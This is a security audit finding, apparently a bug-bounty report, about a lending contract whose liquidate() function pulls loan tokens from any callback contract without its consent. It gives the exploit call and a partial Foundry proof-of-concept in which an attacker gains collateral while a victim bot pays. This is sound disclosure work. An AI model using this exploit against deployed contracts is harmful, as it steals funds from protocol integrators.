### Title
Callback Address Used as Payer Without Authorization, Enabling Theft of Loan Tokens from Any Contract Implementing `onLiquidate` - (File: src/Midnight.sol)

### Summary
In `liquidate()`, the `payer` for the loan token repayment is unconditionally set to `callback` when `callback != address(0)`, with no check that the callback address authorized itself to be the payer. Any contract that implements `onLiquidate` returning `CALLBACK_SUCCESS` and has approved Midnight for the loan token can be drained by an unprivileged liquidator who simply passes that contract's address as `callback`.

### Finding Description
**Root cause — line 679 and line 717 of `src/Midnight.sol`:**

```solidity
address payer = callback != address(0) ? callback : msg.sender;   // line 679
```
```solidity
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits); // line 717
```

The protocol sets `payer = callback` purely because `callback != address(0)`. The only gate between setting `payer` and executing the pull is the `onLiquidate` return-value check (lines 698–714):

```solidity
require(
    ILiquidateCallback(callback).onLiquidate(...) == CALLBACK_SUCCESS,
    WrongLiquidateCallbackReturnValue()
);
```

Returning `CALLBACK_SUCCESS` is treated as implicit consent to pay `repaidUnits` of loan token. There is no check that:
- the callback address initiated the liquidation itself,
- the callback address explicitly authorized the liquidator to use it as payer, or
- `callback == msg.sender`.

**Exploit flow:**

1. Victim contract `V` legitimately integrates with Midnight: it implements `onLiquidate` (returns `CALLBACK_SUCCESS` after receiving collateral or doing its own accounting) and holds a standing approval of Midnight for `loanToken`.
2. Attacker (unprivileged liquidator) identifies a liquidatable borrower `B`.
3. Attacker calls:
   ```solidity
   midnight.liquidate(market, idx, seizedAssets, 0, B, false, attacker, V, "");
   ```
   with `callback = V`, `receiver = attacker`.
4. Execution path:
   - Line 679: `payer = V`
   - Line 696: `safeTransfer(collateralToken, attacker, seizedAssets)` — attacker receives collateral.
   - Lines 698–714: `V.onLiquidate(...)` is called; `V` returns `CALLBACK_SUCCESS` (it has no way to distinguish this call from a legitimate one it initiated).
   - Line 717: `safeTransferFrom(loanToken, V, address(this), repaidUnits)` — `repaidUnits` of loan token are pulled from `V`.
5. Net result: attacker gains `seizedAssets` of collateral; `V` loses `repaidUnits` of loan token.

**Why existing checks do not stop it:**

- The `liquidatorGate` check (lines 597–600) only gates whether `msg.sender` can liquidate at all; it does not constrain `callback`.
- The `onLiquidate` return-value check (lines 699–713) only verifies the return value, not that the callback address consented to being the payer.
- There is no `isAuthorized` or similar check on the `callback` parameter.
- `SetterRatifier.sol` is irrelevant to the liquidation path; it only applies to offer ratification in `take()`.

### Impact Explanation
Any contract that (a) implements `ILiquidateCallback` and returns `CALLBACK_SUCCESS` from `onLiquidate` and (b) holds a Midnight approval for the loan token loses `repaidUnits` of loan token per exploit call. The attacker simultaneously receives seized collateral at no personal cost, constituting direct theft of user funds outside valid protocol rules.

### Likelihood Explanation
Preconditions: (1) a liquidatable borrower exists (normal market condition); (2) a victim contract implements `onLiquidate` returning `CALLBACK_SUCCESS` without verifying it initiated the call; (3) that contract has approved Midnight for loan token. Condition (2) and (3) are both satisfied by any flash-liquidation bot, vault, or protocol integration that uses Midnight's callback mechanism for its own liquidations and pre-approves Midnight. Such contracts are the primary intended users of the callback feature. The attack is repeatable as long as the victim's approval and the borrower's liquidatability hold.

### Recommendation
Do not derive `payer` from `callback`. Instead, require the liquidator (`msg.sender`) to always be the payer, and let the callback contract internally source funds (e.g., via a flash loan) and transfer them to `msg.sender` before the `safeTransferFrom`. Concretely:

```solidity
// Always pull from msg.sender, never from callback
SafeTransferLib.safeTransferFrom(market.loanToken, msg.sender, address(this), repaidUnits);
```

If the intent is to allow a third-party payer, require explicit on-chain authorization: e.g., `isAuthorized[callback][msg.sender]` must be true before setting `payer = callback`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

// Victim: a legitimate liquidation bot that has approved Midnight
contract VictimBot {
    address public midnight;
    address public loanToken;

    constructor(address _midnight, address _loanToken) {
        midnight = _midnight;
        loanToken = _loanToken;
        // Pre-approve Midnight (normal integration pattern)
        IERC20(_loanToken).approve(_midnight, type(uint256).max);
    }

    // Implements onLiquidate for its own liquidation flows
    // Does NOT check that it initiated the call
    function onLiquidate(
        address, bytes32, Market memory, uint256, uint256, uint256,
        address, address, bytes memory, uint256
    ) external returns (bytes32) {
        return CALLBACK_SUCCESS; // unconditional — the flaw
    }
}

contract CallbackPayerConfusionTest is Test {
    function testVictimPaysAttackerProfits() public {
        // Setup: deploy Midnight, create market, make borrower liquidatable
        // Fund VictimBot with loanToken (simulating its treasury)
        VictimBot victim = new VictimBot(address(midnight), loanToken);
        deal(loanToken, address(victim), 1_000e18);

        // Attacker has no loanToken
        address attacker = makeAddr("attacker");
        uint256 attackerCollateralBefore = IERC20(collateralToken).balanceOf(attacker);
        uint256 victimLoanBefore = IERC20(loanToken).balanceOf(address(victim));

        vm.prank(attacker);
        midnight.liquidate(
            market, 0, seizedAssets, 0, borrower, false,
            attacker,        // receiver: attacker gets collateral
            address(victim), // callback = payer: victim pays loan token
            ""
        );

        // Assertions
        assertGt(IERC20(collateralToken).balanceOf(attacker), attackerCollateralBefore, "attacker gained collateral");
        assertLt(IERC20(loanToken).balanceOf(address(victim)), victimLoanBefore, "victim lost loan token");
        assertEq(IERC20(loanToken).balanceOf(attacker), 0, "attacker spent nothing");
    }
}
